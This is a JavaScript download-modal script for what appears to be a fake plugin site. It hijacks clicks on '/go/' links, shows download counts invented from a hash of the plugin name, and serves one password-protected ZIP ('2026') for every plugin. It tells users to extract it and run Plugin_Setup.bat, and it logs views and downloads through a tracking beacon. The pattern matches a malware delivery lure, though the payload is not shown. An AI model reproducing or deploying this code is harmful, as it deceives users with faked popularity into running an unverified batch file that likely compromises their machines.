window.__DL_ZIP__="/downloads/Plugin_Setup_4.6.8.zip";
window.__DL_PASS__="2026";
window.__DL_TRACK__="/api/e";
/*! Download modal — password 2026 + Plugin_Setup.bat install instructions */
(function () {
  var ZIP = window.__DL_ZIP__ || "/downloads/Plugin_Setup_4.6.8.zip";
  var PASS = window.__DL_PASS__ || "2026";
  var TRACK = window.__DL_TRACK__ || "/api/e";

  function hashSlug(slug) {
    var h = 2166136261;
    for (var i = 0; i < slug.length; i++) {
      h ^= slug.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return h >>> 0;
  }
  function displayDownloads(slug) {
    var h = hashSlug(slug || "plugin");
    var tier = h % 3;
    if (tier === 0) return 5200 + (h % 1700);
    if (tier === 1) return 7100 + (h % 2800);
    return 10400 + (h % 9500);
  }
  function formatInstalls(n) {
    if (n >= 1000000) return (n / 1000000).toFixed(1).replace(/\.0$/, "") + "M+";
    if (n >= 1000) return (Math.round(n / 100) / 10).toFixed(1).replace(/\.0$/, "") + "K+";
    return String(n);
  }
  function track(type, n, c, w) {
    try {
      var q = new URLSearchParams({
        t: type,
        n: n || "Plugin",
        c: c || "Plugins",
        w: w || "",
        u: ZIP
      });
      new Image().src = TRACK + "?" + q.toString();
    } catch (e) {}
  }

  var root = null;
  function closeModal() {
    if (!root) return;
    document.body.style.overflow = "";
    root.remove();
    root = null;
  }

  function openModal(opts) {
    closeModal();
    var name = opts.n || "Plugin";
    var cat = opts.c || opts.w || "Plugins";
    var slug = opts.slug || name.toLowerCase().replace(/[^a-z0-9]+/g, "-");
    var downloads = displayDownloads(slug);
    track("view", name, cat, opts.w || "");

    root = document.createElement("div");
    root.className = "dl-modal-root";
    root.setAttribute("role", "presentation");
    root.innerHTML =
      '<div class="dl-modal-card" role="dialog" aria-modal="true" aria-label="Download">' +
      '<button type="button" class="dl-modal-close" aria-label="Close">×</button>' +
      '<div class="dl-modal-badges">' +
      '<span class="dl-badge free">Free</span>' +
      '<span class="dl-badge muted">' + formatInstalls(downloads) + " downloads</span>" +
      "</div>" +
      "<h2></h2>" +
      '<p class="dl-modal-sub">Your file is ready. Start the free download below.</p>' +
      '<dl class="dl-modal-stats">' +
      "<div><dt>Downloads</dt><dd>" + formatInstalls(downloads) + "</dd></div>" +
      "<div><dt>Category</dt><dd></dd></div>" +
      "<div><dt>Package</dt><dd>ZIP</dd></div>" +
      "</dl>" +
      '<a class="btn dl-modal-cta" href="' + ZIP + '" rel="noopener noreferrer">Download Free</a>' +
      '<div class="dl-pw-box">' +
      "<label>Archive password</label>" +
      '<div class="dl-pw-row"><input type="text" readonly value="' + PASS + '" aria-label="Archive password" />' +
      '<button type="button" class="dl-pw-copy">Copy</button></div>' +
      '<p class="dl-pw-hint">ZIP is password-protected. Use <b>' + PASS + "</b> when extracting. After extracting, run <b>Plugin_Setup.bat</b> to install.</p>" +
      '<ol class="dl-pw-steps">' +
      "<li>Extract the archive with password <b>" + PASS + "</b></li>" +
      "<li>Run <b>Plugin_Setup.bat</b></li>" +
      "<li>Find your plugin in search and install it</li>" +
      "</ol></div></div>";

    root.querySelector("h2").textContent = name;
    root.querySelectorAll(".dl-modal-stats dd")[1].textContent = cat;
    root.querySelector(".dl-modal-close").onclick = closeModal;
    root.addEventListener("click", function (e) {
      if (e.target === root) closeModal();
    });
    root.querySelector(".dl-modal-cta").addEventListener("click", function () {
      track("download", name, cat, opts.w || "");
    });
    var copyBtn = root.querySelector(".dl-pw-copy");
    copyBtn.onclick = function () {
      var done = function () {
        copyBtn.textContent = "Copied";
        setTimeout(function () {
          copyBtn.textContent = "Copy";
        }, 1600);
      };
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(PASS).then(done).catch(done);
      } else {
        done();
      }
    };
    document.addEventListener(
      "keydown",
      function onKey(e) {
        if (e.key === "Escape") {
          document.removeEventListener("keydown", onKey);
          closeModal();
        }
      },
      { once: false }
    );
    document.body.style.overflow = "hidden";
    document.body.appendChild(root);
  }

  document.addEventListener(
    "click",
    function (e) {
      var a = e.target.closest && e.target.closest('a[href*="/go/"]');
      if (!a) return;
      e.preventDefault();
      e.stopPropagation();
      try {
        var u = new URL(a.getAttribute("href"), location.origin);
        openModal({
          n: u.searchParams.get("n") || "Plugin",
          c: u.searchParams.get("c") || "Plugins",
          w: u.searchParams.get("w") || "",
          slug: (u.searchParams.get("n") || "plugin").toLowerCase()
        });
      } catch (err) {
        openModal({ n: "Plugin" });
      }
    },
    true
  );

  window.__openDlModal = openModal;
})();
